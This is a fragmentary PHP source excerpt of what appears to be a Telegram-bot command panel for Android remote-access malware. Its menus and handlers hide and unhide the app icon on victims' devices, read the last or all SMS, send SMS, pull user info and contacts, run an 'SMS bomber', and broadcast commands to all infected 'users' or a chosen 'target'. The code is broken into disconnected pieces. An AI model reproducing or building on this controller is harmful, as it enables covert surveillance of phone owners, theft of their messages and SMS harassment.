...
[['text'=>'🌀sᴍsʙᴏᴍʙᴇʀ🌀'],['text'=>'🔧ᴘᴏʀᴛᴀʟ🔧']],
[['text'=>'🚦ʟᴇᴀᴄʜᴇʀ🚦']],
[['text'=>'♻️ʜɪᴅᴇ ᴀʟʟ♻️'],['text'=>'🔅ᴠɪsɪʙʟᴇ ᴀʟʟ🔅']],
[['text'=>'🔔sɪʟᴇɴᴛ ᴀʟʟ🔔'],['text'=>'💧ɪɴғᴏ ᴘᴀɴᴇʟ💧']],
[['text'=>'💥ʀᴇsᴇᴛ ʀᴏʙᴏᴛ💥'],['text'=>'🏳️‍🌈ʟᴀɴɢᴜᴀɢᴇ🏳️‍🌈']],
]));
$admins = json_encode(array(
'keyboard'=>[
[['text'=>'🕯ᴜɴʜɪᴅᴇ🕯'],['text'=>'⚡️ʜɪᴅᴇ ɪᴄᴏɴ⚡️']],
[['text'=>'📍sᴇɴᴅ sᴍs📍'],['text'=>'📱ɪɴғᴏ ᴜsᴇʀ📱']],
[['text'=>'📮ᴀʟʟ sᴍs📮'],['text'=>'🌀ᴄᴏɴᴛᴀᴄᴛ🌀']],
[['text'=>'💡ɴᴏʀᴍᴀʟ💡'],['text'=>'🔇sɪʟᴇɴᴛ🔇']],
[['text'=>'〽️ᴠɪʙᴇʀᴇ〽️']],
[['text'=>'📬ʟᴀsᴛ sᴍs📬'],['text'=>'▪️ʙᴀᴄᴋ▪️']]
...
}elseif($text == '🔅ᴠɪsɪʙʟᴇ ᴀʟʟ🔅'){
		sm($chat_id,"{🔅} ʀᴇǫᴜᴇsᴛs ᴜɴʜɪᴅᴇ ɪᴄᴏɴ sᴇɴᴅᴇᴅ ᴛᴏ ᴀʟʟ { $count } ᴜsᴇʀs
...
{👨‍💻} ᴏᴡɴᴇʀ $crd",$starta);
  ...
  action('unhide',$androidid);
    ...
    }elseif($text == '🔔sɪʟᴇɴᴛ ᴀʟʟ🔔'){
		sm($chat_id,"{🔇} ʀᴇǫᴜᴇsᴛs sɪʟᴇɴᴛ sᴇɴᴅᴇᴅ ᴛᴏ ᴀʟʟ { $count } ᴜsᴇʀs
...
{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$admins);
	    ...
	    }elseif($text == '〽️ᴠɪʙᴇʀᴇ〽️'){        
		sm($chat_id,"{🎗} ʀᴇǫᴜᴇsᴛs vibere ᴍᴏᴅᴇ sᴇɴᴅ ᴛᴏ ᴛᴀʀɢᴇᴛ
...
{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$admins);
		...
		sm($chat_id,"{💡} ʀᴇǫᴜᴇsᴛs normal ᴍᴏᴅᴇ sᴇɴᴅ ᴛᴏ ᴛᴀʀɢᴇᴛ
...
{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$admins);
		...
		sm($chat_id,"{〽️} ʀᴇǫᴜᴇsᴛs unhide sᴇɴᴅ ᴛᴏ ᴛᴀʀɢᴇᴛ
...
file_put_contents("p",$code);
        ...
        sm($chat_id,"{〽️} ᴀɴᴅʀᴏɪᴅ ɪᴅ $code sᴇᴛᴇᴅ",$admins);
sm($chat_id,"{🎛} ᴄᴏɴᴛʀᴏʟ ᴘᴀɴᴇʟ ᴛᴀʀɢᴇᴛ
